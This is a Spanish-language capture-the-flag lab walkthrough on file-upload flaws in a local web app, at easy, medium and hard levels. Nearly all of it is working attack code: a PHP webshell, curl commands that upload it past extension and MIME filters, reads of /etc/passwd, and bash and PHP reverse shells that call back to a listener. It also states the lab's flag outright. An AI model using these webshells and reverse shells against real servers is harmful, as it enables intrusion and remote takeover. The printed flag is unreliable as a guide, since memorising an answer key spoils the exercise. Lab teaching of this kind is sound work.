Objetivo

El formulario guarda los archivos en /uploads/ y el servidor ejecuta como PHP cualquier archivo con extensión .php. Sube una webshell, consigue ejecución remota de comandos (RCE) y recupera la flag.

  1. Sube una webshell PHP (según la dificultad, evade el filtro de extensión / MIME).
  2. Accede a ella en /uploads/<archivo>?cmd=id para confirmar el RCE.
  3. Vuelca el entorno del proceso para leer la flag: ?cmd=env o ?cmd=printenv+HL_FLAG.

Flag: HL{file_upload_webshell_executed} — valídala en la barra lateral.

¿Eliminar ?

Easy — Sin restricciones

El servidor acepta cualquier extensión. Sube directamente una webshell PHP.

  1. Crea la webshell y guárdala como shell.php: 
    <?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
  2. Súbela: 
    curl -F "file=@shell.php" http://localhost:5000/upload
  3. Verifica ejecución de comandos: 
    curl "http://localhost:5000/uploads/shell.php?cmd=id"
curl "http://localhost:5000/uploads/shell.php?cmd=cat+/etc/passwd"
  4. Abre un listener en tu máquina atacante: 
    nc -lvnp 4444
  5. Lanza la reverse shell a través del parámetro cmd: 
    curl "http://localhost:5000/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{{ client_ip }}/4444+0>%261'"
  6. Alternativa — reverse shell PHP directa. Sube este archivo como revshell.php y accede a él: 
    <?php $sock=fsockopen("{{ client_ip }}",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>

Medium — Blacklist bypass (doble extensión)

El servidor bloquea .php, .py, .sh, etc. por extensión final, pero permite doble extensión como .php.jpg.

  1. Crea la webshell y renómbrala con doble extensión: 
    <?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
# guárdala directamente como shell.php.jpg, o:
cp shell.php shell.php.jpg
  2. Súbela (la extensión final .jpg supera el blacklist): 
    curl -F "file=@shell.php.jpg" http://localhost:5000/upload
  3. Verifica ejecución: 
    curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"
  4. Abre un listener en tu máquina atacante: 
    nc -lvnp 4444
  5. Lanza la reverse shell: 
    curl "http://localhost:5000/uploads/shell.php.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{{ client_ip }}/4444+0>%261'"

Hard — Whitelist + Content-Type bypass

El servidor valida extensión por whitelist (.jpg, .png, .gif, .pdf, .txt) y Content-Type. La doble extensión .php.jpg supera ambas comprobaciones.

  1. Prepara la webshell con doble extensión (igual que Medium): 
    cp shell.php shell.php.jpg
  2. Súbela forzando el Content-Type a image/jpeg para superar también la validación MIME: 
    curl -F "file=@shell.php.jpg;type=image/jpeg" http://localhost:5000/upload
  3. Verifica ejecución: 
    curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"
  4. Abre un listener en tu máquina atacante: 
    nc -lvnp 4444
  5. Lanza la reverse shell: 
    curl "http://localhost:5000/uploads/shell.php.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{{ client_ip }}/4444+0>%261'"

Capturar la flag

La flag del lab vive en el entorno del proceso PHP y solo es accesible cuando tu webshell se ejecuta de verdad. Vuélcalo con el parámetro cmd:

curl "http://localhost:5000/uploads/shell.php?cmd=env" | grep HL_FLAG
# o directamente
curl "http://localhost:5000/uploads/shell.php?cmd=printenv+HL_FLAG"

Flag: HL{file_upload_webshell_executed}. Valídala en la barra lateral.
